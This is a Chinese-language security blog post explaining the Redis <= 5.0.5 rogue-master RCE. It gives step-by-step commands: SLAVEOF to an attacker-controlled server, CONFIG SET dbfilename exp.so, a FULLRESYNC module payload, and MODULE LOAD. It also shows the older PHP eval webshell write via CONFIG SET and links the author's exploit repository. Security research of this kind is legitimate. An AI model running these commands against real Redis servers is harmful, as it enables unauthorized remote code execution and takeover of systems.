---
title: "Redis <= 5.0.5 RCE"
date: 2019-07-07T10:08:33+08:00
categories: ["Researching", "Security"]
tags: ["web"]
---

# Redis <= 5.0.5 RCE

本文介绍由LCBC战队队员Pavel Toporkov在zeronights 2018上介绍的redis 4.x RCE攻击。会议slide链接：<https://2018.zeronights.ru/wp-content/uploads/materials/15-redis-post-exploitation.pdf>

攻击场景：
* 能够访问远程redis的端口（直接访问或者SSRF）
* 对redis服务器可以访问到的另一台服务器有控制权

本文的exp开源在github上：

<https://github.com/n0b0dyCN/redis-rogue-server>

欢迎大家来star~

## 背景知识

### redis协议

redis支持两种传输协议，一种是明文传输，其命令如下：

``` redis
SET keyname value\n
```

另一种是经过编码的传输协议：

``` redis
*3\r\n$3\r\nSET\r\n$7\r\nkeyname\r\n$5\r\nval
ue\r\n
```

将其格式化大概长这个样子：

``` redis
*<number of arguments> CR LF
$<number of bytes of argument 1> CR LF
<argument data> CR LF
...
$<number of bytes of argument N> CR LF
<argument data> CR LF
```

笔者主要使用第二种协议实现exp。

### CONFIG SET

CONFIG SET命令用于对redis进行配置。常用如下：

``` redis
CONFIG SET dir /VAR/WWW/HTML
CONFIG SET dbfilename sh.php
SET PAYLOAD '<?php eval($_GET[0]);?>'
BGSAVE
```

这是之前redis常用的getshell套路。但是由于权限问题，并不是总能成功写入文件。

### SLAVEOF

SLAVEOF命令为redis设置主服务器。

``` redis
127.0.0.1:6379> SLAVEOF 127.0.0.1 7000
```
该命令将端口为6379的服务器的主服务器设置为端口为7000的服务器。端口为6379的服务器将开始同步端口为7000服务器的数据来保证数据的一致性。同时服务器可以随时取消主从状态：

``` redis
127.0.0.1:6379> SLAVEOF NO ONE
```

SLAVE和MASTER之间的握手机制如下：

![SYNC protocol](/images/posts/redis-4.x-rce/sync-protocol.png)

握手后SLAVE将向MASTER发送PSYNC请求同步，一般有三种状态：

* FULLRESYNC：表示需要全量复制
* CONTINUE：表示可以进行增量同步
* ERR：表示主服务器还不支持PSYNC

### MODULE LOAD

MODULE LOAD命令为redis加载外部的模块，该模块可以自定义。模块编写方法可以参考官方示例：<https://github.com/RedisLabs/RedisModulesSDK>。

该命令使用方式如下：

``` redis
MODULE LOAD /path/to/exp.so
MODULE UNLOAD exp
```

## 攻击流程

### Rogue Server

我们需要建一个服务器来在同步过程中向redis server发送我们的module。服务器要响应redis的请求：

``` redis
[>] PING - test if a connection is still alive
[<] +PONG
[>] REPLCONF - exchange replication information between master and slave
[<] +OK
[>] PSYNC/SYNC - synchronize slave state with the master
[<] +FULLRESYNC
```

### 步骤

#### 将redis设置为我们的slave
``` redis
SLAVEOF server port
```

#### 设置redis的数据库文件
``` redis
CONFIG SET dbfilename exp.so
```

#### 从rogue server接收module
``` redis
+FULLRESYNC <Z*40> 1\r\n$<len>\r\n<payload>
```

#### 加载模块
``` redis
MODULE LOAD ./exp.so
```

### 攻击效果

设置主服务器与数据库文件：
![step 1](/images/posts/redis-4.x-rce/step1.png)

向redis server发送payload：
![step 2](/images/posts/redis-4.x-rce/step2.png)

加载模块：
![step 3](/images/posts/redis-4.x-rce/step3.png)

最终可以实现命令执行：
![step 4](/images/posts/redis-4.x-rce/step4.png)
